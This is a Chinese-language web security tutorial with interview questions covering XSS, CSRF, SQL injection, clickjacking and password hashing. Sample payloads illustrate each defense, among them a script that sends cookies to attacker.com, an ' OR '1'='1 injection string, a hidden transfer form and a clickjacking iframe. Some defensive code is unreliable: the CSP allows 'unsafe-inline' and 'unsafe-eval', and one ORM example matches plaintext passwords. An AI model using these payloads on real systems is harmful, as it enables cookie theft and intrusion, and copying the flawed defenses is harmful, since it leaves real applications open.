### Web安全
Web安全是保护Web应用免受各种攻击和威胁的重要领域。

#### 1. XSS（跨站脚本攻击）
##### 1.1 基本概念
```javascript
// 反射型XSS
// 恶意URL
https://example.com/search?q=<script>alert('XSS')</script>

// 存储型XSS
// 评论内容
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

// DOM型XSS
// 不安全的DOM操作
document.write(location.hash.substring(1));
```

##### 1.2 防御措施
```javascript
// 输入过滤
function sanitizeInput(input) {
  return input.replace(/[&<>"']/g, function(match) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return entities[match];
  });
}

// 输出编码
function encodeOutput(output) {
  return output.replace(/[&<>"']/g, function(match) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return entities[match];
  });
}

// 使用CSP
// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
```

#### 2. CSRF（跨站请求伪造）
##### 2.1 基本概念
```html
<!-- 恶意表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="submit" value="Click to win!">
</form>
```

##### 2.2 防御措施
```javascript
// 使用CSRF Token
// 服务器生成Token
const csrfToken = generateToken();
res.cookie('csrf-token', csrfToken);

// 客户端发送Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.cookie.match(/csrf-token=([^;]+)/)[1]
  },
  body: JSON.stringify(data)
});

// 验证Token
app.use((req, res, next) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.cookies['csrf-token']) {
    return res.status(403).send('Invalid CSRF token');
  }
  next();
});
```

#### 3. SQL注入
##### 3.1 基本概念
```sql
-- 恶意输入
' OR '1'='1

-- 注入查询
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

##### 3.2 防御措施
```javascript
// 使用参数化查询
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

// 使用ORM
const user = await User.findOne({
  where: {
    username: username,
    password: password
  }
});
```

#### 4. 点击劫持
##### 4.1 基本概念
```html
<!-- 恶意iframe -->
<iframe src="https://bank.com" style="opacity: 0.1; position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></iframe>
```

##### 4.2 防御措施
```javascript
// 使用X-Frame-Options
res.setHeader('X-Frame-Options', 'DENY');

// 使用CSP
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
```

#### 5. 密码安全
##### 5.1 基本概念
```javascript
// 密码哈希
const bcrypt = require('bcrypt');
const saltRounds = 10;

// 生成哈希
bcrypt.hash(password, saltRounds, function(err, hash) {
  // 存储hash
});

// 验证密码
bcrypt.compare(password, hash, function(err, result) {
  // 验证结果
});
```

##### 5.2 最佳实践
```javascript
// 密码策略
const passwordPolicy = {
  minLength: 8,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true
};

// 密码验证
function validatePassword(password) {
  return (
    password.length >= passwordPolicy.minLength &&
    /[A-Z]/.test(password) &&
    /[a-z]/.test(password) &&
    /[0-9]/.test(password) &&
    /[!@#$%^&*]/.test(password)
  );
}
```

#### 6. 最佳实践
1. 使用HTTPS
2. 实现CSP
3. 设置安全头
4. 使用参数化查询
5. 实现CSRF保护
6. 密码加密存储
7. 输入验证
8. 输出编码
9. 会话管理
10. 错误处理

#### 7. 常见面试题
1. **常见Web攻击类型**
   - XSS
   - CSRF
   - SQL注入
   - 点击劫持

2. **如何防御XSS攻击**
   - 输入过滤
   - 输出编码
   - CSP配置
   - 安全头设置

3. **如何保证密码安全**
   - 密码哈希
   - 加盐处理
   - 密码策略
   - 安全存储 